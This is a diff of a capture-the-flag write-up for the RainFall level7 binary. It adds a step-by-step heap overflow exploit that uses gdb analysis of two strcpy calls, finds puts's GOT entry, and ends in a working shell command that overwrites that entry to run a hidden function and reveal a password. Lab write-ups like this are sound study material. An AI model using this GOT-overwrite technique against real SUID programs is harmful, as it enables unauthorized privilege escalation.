@@ -38,20 +38,96 @@ int main(unsigned int v2)
 }
 ```
 
-We want to look for the addresses of `c` and `m`:
+We want to look for the address and `m`:
 ```
 objdump -t level7
 ...
-08049960 g     O .bss	00000050              c
 080484f4 g     F .text	0000002d              m
 ...
 ```
 
-And the address of `puts`:
+Also, we notice a `puts` call:
 ```
-objdump -TR level7
-...
-08049928 R_386_JUMP_SLOT   puts
-08049918 R_386_JUMP_SLOT   fgets
-...
+   0x080485f7 <+214>:	call   0x8048400 <puts@plt>
+```
+
+Let's figure out the address of `puts` in the GOT:
+We `disassemble` the address `0x8048400`, to get to the function tremplin:
+```
+(gdb) disass 0x8048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
+   0x08048406 <+6>:	push   0x28
+   0x0804840b <+11>:	jmp    0x80483a0
+End of assembler dump.
+```
+Upon getting in the function tremplin, the code would jump to `0x8049928`, stored in the GOT:
+```
+(gdb) x 0x8049928
+0x8049928 <puts@got.plt>:	0x08048406
+```
+We can also get that address with `info functions` in GDB.
+`0x8049928` is the address we want to overwite to take control of the programme execution. Now let's find a way to do so!
+
+We noticed, thanks to the decompilation, that the program required two arguments. As `strcpy` doesn't check if what's being written to its buffer fits inside before copying it, we can abuse it to crash the programme.
+```
+level7@RainFall:~$ ./level7 AAAABBBBCCCCDDDDEEEE a
+~~
+level7@RainFall:~$ ./level7 AAAABBBBCCCCDDDDEEEEF a
+Segmentation fault (core dumped)
+```
+As we can see, when we added the `F`, the program crashed.
+
+Also, we can make the programme crash with the second argument:
+```
+(gdb) r AAAABBBBCCCCDDDDEEEE 0000111122223333444455556666
+Starting program: /home/user/level7/level7 AAAABBBBCCCCDDDDEEEE 0000111122223333444455556666
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7e90ba7 in fgets () from /lib/i386-linux-gnu/libc.so.6
+(gdb) backtrace
+#0  0xb7e90ba7 in fgets () from /lib/i386-linux-gnu/libc.so.6
+#1  0x080485f0 in main ()
+(gdb) r AAAABBBBCCCCDDDDEEEEF a
+Starting program: /home/user/level7/level7 AAAABBBBCCCCDDDDEEEEF a
+
+Program received signal SIGSEGV, Segmentation fault.
+0xb7eb8f23 in ?? () from /lib/i386-linux-gnu/libc.so.6
+(gdb) backtrace
+#0  0xb7eb8f23 in ?? () from /lib/i386-linux-gnu/libc.so.6
+#1  0x080485c2 in main ()
+```
+Thanks to `backtrace`, and the fact that two different conditions make us segfault, we know that we have two different segfaults vulnerabilities.
+By digging on the topic, we understand that the first `strcpy` will give us the flexibility to write **anywhere** we want (where the `FFFF` are), and the second let's us write **whatever** we want.
+Here, we confirm that we succesfully hijacked the execution flow by writing 0s to EIP, by replacing the content stored at address `0x8049928`, `puts`'s address:
+```
+(gdb) run $(python -c 'print "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"') 000011112222
+Starting program: /home/user/level7/level7 $(python -c 'print "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"') 000011112222
+
+Program received signal SIGSEGV, Segmentation fault.
+0x30303030 in ?? ()
+(gdb) info registers
+eax            0x80486eb	134514411
+ecx            0xbffff8db	-1073743653
+edx            0x80486e9	134514409
+ebx            0xb7fd0ff4	-1208152076
+esp            0xbffff6ac	0xbffff6ac
+ebp            0xbffff6d8	0xbffff6d8
+esi            0x0	0
+edi            0x0	0
+eip            0x30303030	0x30303030    <------ 0000 here
+eflags         0x210246	[ PF ZF IF RF ID ]
+cs             0x73	115
+ss             0x7b	123
+ds             0x7b	123
+es             0x7b	123
+fs             0x0	0
+gs             0x33	51
+```
+
+We eventually pass the address of `m` as the second argument, and get our password.
+Make sure to run it **outside** of GDB, as to run `fgets` the SUID bit needs to be set, and GDB won't run it with the file owner's privileges as it disables SUID!
+
+```bash
+./level7 $(python -c 'print "AAAABBBBCCCCDDDDEEEE\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
 ```
